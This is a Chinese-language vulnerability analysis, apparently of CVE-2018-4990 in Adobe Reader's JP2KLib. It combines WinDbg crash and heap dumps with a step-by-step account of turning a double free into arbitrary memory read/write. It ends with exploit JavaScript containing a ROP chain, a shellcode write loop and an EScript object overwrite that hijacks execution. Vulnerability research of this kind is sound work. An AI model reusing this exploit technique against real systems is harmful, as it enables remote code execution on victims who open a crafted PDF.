#### 漏洞说明
#### 分析平台
#### 数据结构介绍
###### ArrayObject
[数据结构分析](https://bbs.pediy.com/thread-250449.htm#arraybufferobject)
###### Uint32ArrayObject
###### ArrayBufferObject
###### DataViewObject
#### 漏洞分析
1. 开启页堆和用户态栈回溯
```
gflag.exe -i  AcroRd32.exe +hpa +ust
```
2. 使用pdfstreamDumper 打开POC.pdf,修改POC中js代码中如果所示的代码。

![](./images/1.png)

3. 加载poc.pdf运行，在弹出对话框之后，使用windbg附加AcroRd32.exe.发生异常。

```
(ec0.1198): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=00ff0000 edi=00ff0000
eip=73f46e88 esp=0032a208 ebp=0032a254 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\syswow64\verifier.dll -
verifier!VerifierDisableFaultInjectionExclusionRange+0xf38:
73f46e88 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:002b:d0d0d0b0=????????

```
可以看到，edx所指向的数据JP2KLib!JP2KCopyRect+0xbae6处被释放。
```
0:000> kv
ChildEBP RetAddr  Args to Child
WARNING: Stack unwind information not available. Following frames may be wrong.
0032a254 73f46f95 00ff1000 d0d0d0d0 00ff0000 verifier!VerifierDisableFaultInjectionExclusionRange+0xf38
0032a278 73f47240 00ff1000 d0d0d0d0 0032a2e8 verifier!VerifierDisableFaultInjectionExclusionRange+0x1045
0032a294 73f49080 00ff1000 d0d0d0d0 0030957b verifier!VerifierDisableFaultInjectionExclusionRange+0x12f0
0032a2b0 7731166c 00ff0000 01000002 d0d0d0d0 verifier!VerifierDisableFaultInjectionExclusionRange+0x3130
0032a2f8 772ca7c3 00ff0000 01000002 d0d0d0d0 ntdll!RtlpNtEnumerateSubKey+0x4937
0032a3ec 77272be5 00000000 d0d0d0d0 53d99f98 ntdll!RtlUlonglongByteSwap+0xdab3
0032a40c 754a14ad 00ff0000 00000000 d0d0d0d0 ntdll!RtlQueryPerformanceCounter+0x281
0032a420 711becfa 00ff0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14
0032a434 69c40574 d0d0d0d0 4e15adaa 53ea8fac MSVCR120!free+0x1a
0032a554 69c56482 53f22fb8 53d97fd8 000000fd JP2KLib!JP2KCopyRect+0xbae6
0032a5ac 6b4c6cfc 53f14e88 53f0efd0 53d97fd8 JP2KLib!JP2KImageInitDecoderEx+0x24
0032a634 6b4c8696 53f1afa8 53ea8fac 53f1afa8 AcroRd32_6aed0000!AX_PDXlateToHostEx+0x261843
0032a694 6b4bd785 53ea8fac 0032a6b4 6b4c6640 AcroRd32_6aed0000!AX_PDXlateToHostEx+0x2631dd
0032a6a0 6b4c6640 53ea8fac 53dd4f70 53dcefc8 AcroRd32_6aed0000!AX_PDXlateToHostEx+0x2582cc
0032a6b4 6b0b030d 53ea8fac 53dcefd0 53dcefc8 AcroRd32_6aed0000!AX_PDXlateToHostEx+0x261187
0032a6f0 6b0af92b c0010000 00000016 53dcefc8 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x7867d
0032a7c0 6b0aebc6 0032ab68 00000000 2f6a9697 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x77c9b
0032ab10 6b0aeb88 0032ab68 53cf8a50 2f6a96c3 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x76f36
0032ab44 6b0aea71 53dcee28 53cf8a50 0032abfc AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x76ef8
0032abb0 6b0ad949 c0010000 00000016 53cf8a50 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x76de1
0032b01c 6b0aade9 0032b308 53d81598 c0010000 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x75cb9
0032c7f4 6b0aaa51 53d81598 c0010000 00000016 AcroRd32_6aed0000!PDMediaQueriesGetCosObj+0x73159

```
修改a1如下所示，a1[0] = 0x12348888,方便我们定位内存。在对a1的所有奇数的元素进行释放之后，a1的
内存布局如下。
![](./images/2.png)
```
0:011> s -d 0x0 l?0x7fffffff 0x12348888
36b01000  12348888 ffffff81 00000000 ffffff86  ..4.............
0:011> dd 36b01000
          a[0]     a[0].type a[1]     a[1].type
36b01000  12348888 ffffff81 00000000 ffffff86
36b01010  27f926b8 ffffff87 00000000 ffffff86
36b01020  27f92768 ffffff87 00000000 ffffff86
36b01030  27f92818 ffffff87 00000000 ffffff86
36b01040  27f928c8 ffffff87 00000000 ffffff86
36b01050  27f92978 ffffff87 00000000 ffffff86
36b01060  27f92a28 ffffff87 00000000 ffffff86
36b01070  27f92ad8 ffffff87 00000000 ffffff86

```
![](./images/3.png)
同时可以看到每个a1[il]的元素的buffer的内存的大小为0x400(252*4+0x10(buffer_header)),所以在执行完a1[i]奇数元素释放之后，会存在大小为0x400的busy和free交替出现的内存空间。
```
0:011> !heap -p -a 0x3162ac10
address 3162ac10 found in
    _DPH_HEAP_ROOT @ 4ff1000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                31542ea0:         3162ac00              400 -         3162a000             2000
    73f48e89 verifier!VerifierDisableFaultInjectionExclusionRange+0x00002f39
    77310e9e ntdll!RtlpNtEnumerateSubKey+0x00004169
    772caaa7 ntdll!RtlUlonglongByteSwap+0x0000dd97
    77273441 ntdll!RtlQueryPerformanceCounter+0x00000add
    739211f9 MSVCR120!memcmp+0x0000034d
    7392cc17 MSVCR120!calloc+0x00000018
    705c0466 EScript!PlugInMain+0x0000d8c7
    706c83c1 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b16dc
    706c883a EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b1b55
    706cbcf7 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b5012
    706cbedb EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b51f6
    706cdc4a EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b6f65
    706cb880 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x000b4b9b

```
js代码var f1 = this.getField("Button1");导致0x0d0e0048，0x0d0f0058两处大小为0x10000的内存被释放，释放后，合并成0x1fff8大小的内存。
![](./images/4.png)
```
0:000> !heap -p -a 0d0e0048
    address 0d0e0048 found in
    _HEAP @ 1610000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0d0e0040 4000 0000  [00]   0d0e0048    1fff8 - (free)
```
接着使用ArrayBuffer(0x20000-24)对已经释放的内存进行占位。
![](./images/5.png)
接着利用地址 0d0e0048处ByteLength 为0x20000-24的arrayBuffer对象的读写能力，修改0d0f0048处已被释放的arrayBuffer的
byteLength 为0x66666666，使用arrayBuffer 初始化dataView,实现任意内存读写。关于[dataview](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/DataView)

![](./images/6.png)

```
0:014> dd 0d0f0048
0d0f0048  00000000 66666666 063ea500 00000000
0d0f0058  00000000 00000000 00000000 00000000
0d0f0068  00000000 00000000 00000000 00000000
0d0f0078  00000000 00000000 00000000 00000000
0d0f0088  00000000 00000000 00000000 00000000
0d0f0098  00000000 00000000 00000000 00000000
0d0f00a8  00000000 00000000 00000000 00000000
0d0f00b8  00000000 00000000 00000000 00000000

```
```
for(var i2 = 1;i2<0x10;i2++)
{
		arr1[i2] = new Uint32Array(sprayarr[i1+i2]);
		arr1[i2][0] = i2;
}

初始地址为0x0d0f0058。
for(var i2=0x30000;i2<0x10000*0x10;i2=i2+4)
			{
				if( biga.getUint32(i2,true)==spraylen && biga.getUint32(i2+4,true) > spraypos  )
				{
					  mydv = biga;
						var itmp = mydv.getUint32(i2+12,true);
						myarray = arr1[itmp];
						mypos = biga.getUint32(i2+4,true) - spraypos +0x50;

            mydv.setUint32(mypos-0x10,0x100000,true);
            //MyarrayBase = 0x0d130058
						myarraybase = mydv.getUint32(mypos,true);
						var rop1 = [0x6b78845b,0x6b78845b,0x6b78845a,0x6b7d7084,0x6b651767,0x6b64230d,myarraybase,0x6b65ecaf,0x6b663a4b,myarraybase,0x00010201,0x00001000,0x00000040,0xcccccccc,0x41414141];
						var obj1 = myread(myarraybase-8);
						var obj2 = myread(obj1+4);
						var obj3 = myread(obj2);
            //泄露EScript地址
						var dll_base = (myread(obj3+8)-0x00010000 )&0xffff0000;
                             app.alert(dll_base);
						var bkm = this.bookmarkRoot;
						var objescript = 0x23A59BA4-0x23800000 + dll_base;
						objescript = myread(objescript);
						for(var i2=0;i2< rop1.length ;i2=i2+1)
						{
						myarray[i2+3] = rop1[i2] >  0x6b640000 ?(rop1[i2] - 0x6b640000 +dll_base):rop1[i2];
						}
						myarray[i2+3-2] = 0x90909090;
						for(var i3=0;i3< dlldata.length ;i3=i3+1)
						{
						myarray[i2+3+i3] = dlldata[i3];
						}
						mywrite(objescript, 0x6b707d06-0x6b640000+dll_base);
						mywrite(objescript+4,myarraybase);
						mywrite(objescript+0x598,0x6b68389f-0x6b640000+dll_base);
						bkm.execute();
						break;
				}

```
![](./images/8.png)


#### 参考
https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/
https://bbs.pediy.com/thread-226971.htm
https://bbs.pediy.com/thread-250449.htm
